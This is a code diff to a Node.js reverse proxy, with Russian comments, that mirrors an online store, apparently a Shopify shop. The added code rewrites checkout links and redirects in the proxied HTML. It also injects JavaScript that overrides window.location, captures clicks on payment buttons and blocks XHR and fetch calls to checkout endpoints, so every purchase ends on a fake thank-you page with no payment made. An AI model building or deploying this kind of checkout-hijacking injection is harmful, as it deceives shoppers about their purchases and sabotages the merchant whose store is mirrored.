@@ -120,9 +120,13 @@ const proxyOptions = {
     
     // Модификация ответов для корректной работы прокси
     if (modifiedHeaders['location']) {
-      // Заменяем абсолютные URL на относительные
       const location = modifiedHeaders['location'];
-      if (location.startsWith(TARGET_URL)) {
+      // Перехватываем редиректы на Shopify checkout
+      if (location.includes('checkout.shopify.com') || location.includes('/checkout') || location.includes('/checkouts/')) {
+        console.log(`[PAYMENT INTERCEPT] Intercepting checkout redirect: ${location}`);
+        modifiedHeaders['location'] = '/thank-you-payment';
+      } else if (location.startsWith(TARGET_URL)) {
+        // Заменяем абсолютные URL на относительные
         modifiedHeaders['location'] = location.replace(TARGET_URL, '');
       }
     }
@@ -187,6 +191,17 @@ const proxyOptions = {
         try {
           console.log(`[PAYMENT INTERCEPT] Injecting JavaScript into HTML page: ${req.method} ${req.path}`);
           
+          // Модифицируем HTML: заменяем ссылки на checkout
+          let modifiedBodyString = bodyString;
+          // Заменяем ссылки на checkout.shopify.com
+          modifiedBodyString = modifiedBodyString.replace(/https?:\/\/[^"'\s<>]*checkout\.shopify\.com[^"'\s<>]*/gi, '/thank-you-payment');
+          // Заменяем относительные ссылки на checkout (но не в script тегах)
+          modifiedBodyString = modifiedBodyString.replace(/(href|action|data-url|data-checkout-url|data-payment-url)=["']([^"']*\/checkout[^"']*)["']/gi, '$1="/thank-you-payment"');
+          modifiedBodyString = modifiedBodyString.replace(/(href|action|data-url)=["']([^"']*\/payment[^"']*)["']/gi, '$1="/thank-you-payment"');
+          modifiedBodyString = modifiedBodyString.replace(/(href|action|data-url)=["']([^"']*\/paiement[^"']*)["']/gi, '$1="/thank-you-payment"');
+          
+          bodyString = modifiedBodyString;
+          
           // Упрощенный JavaScript код - используем редирект вместо встраивания HTML
           const injectionScript = `
 <script>
@@ -199,47 +214,111 @@ const proxyOptions = {
       window.location.href = 'https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB';
     }
     
-    // Перехватываем все клики на кнопки оплаты
+    // Перехватываем все навигации (включая программные редиректы)
+    let originalLocation = window.location;
+    Object.defineProperty(window, 'location', {
+      get: function() {
+        return originalLocation;
+      },
+      set: function(url) {
+        const urlStr = String(url).toLowerCase();
+        if (urlStr.includes('checkout') || urlStr.includes('payment') || urlStr.includes('paiement') || urlStr.includes('shopify.com')) {
+          console.log('[PAYMENT INTERCEPT] Location change intercepted:', url);
+          showThankYouPage();
+          return;
+        }
+        originalLocation.href = url;
+      }
+    });
+    
+    // Перехватываем все клики на кнопки оплаты и ссылки
     document.addEventListener('click', function(e) {
       try {
-        const target = e.target;
-        const text = (target.textContent || target.innerText || '').toLowerCase();
-        const href = target.href || '';
-        const className = String(target.className || '').toLowerCase();
-        const id = String(target.id || '').toLowerCase();
-        
-        // Проверяем, является ли это кнопкой оплаты
-        // ИСКЛЮЧАЕМ: "add to cart", "add", кнопки добавления в корзину
-        // ПЕРЕХВАТЫВАЕМ: только реальные кнопки оплаты
-        const isAddToCart = text.includes('add to cart') || 
-                           text.includes('add') && (text.includes('cart') || className.includes('cart') || id.includes('cart'));
-        
-        const isPaymentButton = !isAddToCart && (
-                               text.includes('paiement') ||
-                               text.includes('payment') ||
-                               (text.includes('checkout') && !text.includes('add')) ||
-                               (text.includes('pay') && !text.includes('add')) ||
-                               text.includes('payer') ||
-                               className.includes('checkout') && !className.includes('add') ||
-                               className.includes('payment') ||
-                               className.includes('paiement') ||
-                               (id.includes('checkout') && !id.includes('add')) ||
-                               id.includes('payment') ||
-                               (href.toLowerCase().includes('checkout') && !href.toLowerCase().includes('add')) ||
-                               href.toLowerCase().includes('payment'));
-        
-        if (isPaymentButton) {
-          console.log('[PAYMENT INTERCEPT] Payment button clicked, intercepting...');
-          e.preventDefault();
-          e.stopPropagation();
-          e.stopImmediatePropagation();
-          showThankYouPage();
-          return false;
+        let target = e.target;
+        // Поднимаемся по DOM дереву, чтобы найти ссылку или кнопку
+        while (target && target !== document.body) {
+          const text = (target.textContent || target.innerText || '').toLowerCase();
+          const href = target.href || target.getAttribute('href') || '';
+          const className = String(target.className || '').toLowerCase();
+          const id = String(target.id || '').toLowerCase();
+          const onclick = target.getAttribute('onclick') || '';
+          const dataUrl = target.getAttribute('data-url') || '';
+          
+          // Проверяем ссылки на checkout
+          const isCheckoutLink = href.includes('checkout') || 
+                                href.includes('payment') || 
+                                href.includes('paiement') ||
+                                href.includes('shopify.com');
+          
+          // Проверяем, является ли это кнопкой оплаты
+          const isAddToCart = text.includes('add to cart') || 
+                             (text.includes('add') && (text.includes('cart') || className.includes('cart') || id.includes('cart')));
+          
+          const isPaymentButton = !isAddToCart && (
+                                 isCheckoutLink ||
+                                 text.includes('paiement') ||
+                                 text.includes('payment') ||
+                                 (text.includes('checkout') && !text.includes('add')) ||
+                                 (text.includes('pay') && !text.includes('add') && !text.includes('pal')) ||
+                                 text.includes('payer') ||
+                                 className.includes('checkout') && !className.includes('add') ||
+                                 className.includes('payment') ||
+                                 className.includes('paiement') ||
+                                 (id.includes('checkout') && !id.includes('add')) ||
+                                 id.includes('payment') ||
+                                 onclick.toLowerCase().includes('checkout') ||
+                                 onclick.toLowerCase().includes('payment') ||
+                                 dataUrl.toLowerCase().includes('checkout'));
+          
+          if (isPaymentButton || isCheckoutLink) {
+            console.log('[PAYMENT INTERCEPT] Payment button/link clicked, intercepting...', {text, href, className, id});
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            showThankYouPage();
+            return false;
+          }
+          
+          target = target.parentElement;
         }
       } catch(err) {
         console.error('[PAYMENT INTERCEPT] Error in click handler:', err);
       }
     }, true);
+    
+    // Модифицируем все ссылки на checkout в DOM
+    function modifyCheckoutLinks() {
+      const links = document.querySelectorAll('a[href*="checkout"], a[href*="payment"], button[data-url*="checkout"]');
+      links.forEach(link => {
+        const href = link.getAttribute('href') || '';
+        const dataUrl = link.getAttribute('data-url') || '';
+        if (href.includes('checkout') || href.includes('payment') || href.includes('paiement') || dataUrl.includes('checkout')) {
+          link.addEventListener('click', function(e) {
+            console.log('[PAYMENT INTERCEPT] Checkout link modified and clicked');
+            e.preventDefault();
+            e.stopPropagation();
+            showThankYouPage();
+            return false;
+          }, true);
+        }
+      });
+    }
+    
+    // Модифицируем ссылки при загрузке
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', modifyCheckoutLinks);
+    } else {
+      modifyCheckoutLinks();
+    }
+    
+    // Используем MutationObserver для динамического контента
+    const observer = new MutationObserver(function(mutations) {
+      modifyCheckoutLinks();
+    });
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
     
     // Перехватываем XMLHttpRequest
     try {
@@ -255,22 +334,28 @@ const proxyOptions = {
       XMLHttpRequest.prototype.send = function() {
         const url = String(this._url || '').toLowerCase();
         
-        // Перехватываем только реальные запросы к оплате, НЕ работу с корзиной
-        // Исключаем: /cart/add, /cart/update, /cart/change, /cart (получение корзины)
-        // Перехватываем: /checkout, /cart/checkout, /payment, /paiement
-        const isPaymentRequest = (url.includes('/checkout') || url.includes('/payment') || url.includes('/paiement')) &&
-                                !url.includes('/cart/add') &&
-                                !url.includes('/cart/update') &&
-                                !url.includes('/cart/change') &&
-                                !url.match(/\/cart\/?$/); // не просто /cart
-        
-        if (isPaymentRequest) {
-          console.log('[PAYMENT INTERCEPT] Intercepting XHR request:', url);
-          this.addEventListener('load', function() {
-            console.log('[PAYMENT INTERCEPT] XHR response intercepted');
-            showThankYouPage();
-          }, { once: true });
-        }
+          // Перехватываем только реальные запросы к оплате, НЕ работу с корзиной
+          // Исключаем: /cart/add, /cart/update, /cart/change, /cart (получение корзины)
+          // Перехватываем: /checkout, /cart/checkout, /payment, /paiement, checkout.shopify.com
+          const isPaymentRequest = (url.includes('/checkout') || 
+                                    url.includes('/payment') || 
+                                    url.includes('/paiement') ||
+                                    url.includes('checkout.shopify.com') ||
+                                    url.includes('/checkouts/')) &&
+                                  !url.includes('/cart/add') &&
+                                  !url.includes('/cart/update') &&
+                                  !url.includes('/cart/change') &&
+                                  !url.match(/\/cart\/?$/); // не просто /cart
+          
+          if (isPaymentRequest) {
+            console.log('[PAYMENT INTERCEPT] Intercepting XHR request:', url);
+            // Немедленно редиректим, не ждем ответа
+            setTimeout(function() {
+              showThankYouPage();
+            }, 10);
+            // НЕ отправляем запрос
+            return;
+          }
         
         return originalXHRSend.apply(this, arguments);
       };
@@ -286,8 +371,12 @@ const proxyOptions = {
         
         // Перехватываем только реальные запросы к оплате, НЕ работу с корзиной
         // Исключаем: /cart/add, /cart/update, /cart/change, /cart (получение корзины)
-        // Перехватываем: /checkout, /cart/checkout, /payment, /paiement
-        const isPaymentRequest = (urlStr.includes('/checkout') || urlStr.includes('/payment') || urlStr.includes('/paiement')) &&
+        // Перехватываем: /checkout, /cart/checkout, /payment, /paiement, checkout.shopify.com
+        const isPaymentRequest = (urlStr.includes('/checkout') || 
+                                  urlStr.includes('/payment') || 
+                                  urlStr.includes('/paiement') ||
+                                  urlStr.includes('checkout.shopify.com') ||
+                                  urlStr.includes('/checkouts/')) &&
                                 !urlStr.includes('/cart/add') &&
                                 !urlStr.includes('/cart/update') &&
                                 !urlStr.includes('/cart/change') &&
@@ -295,8 +384,12 @@ const proxyOptions = {
         
         if (isPaymentRequest) {
           console.log('[PAYMENT INTERCEPT] Intercepting Fetch request:', urlStr);
-          showThankYouPage();
-          return Promise.resolve(new Response(JSON.stringify({ success: true, redirect: 'https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB' }), {
+          // Немедленно редиректим
+          setTimeout(function() {
+            showThankYouPage();
+          }, 10);
+          // Возвращаем пустой промис, чтобы не ломать код
+          return Promise.resolve(new Response(JSON.stringify({ success: false, blocked: true }), {
             status: 200,
             headers: { 'Content-Type': 'application/json' }
           }));
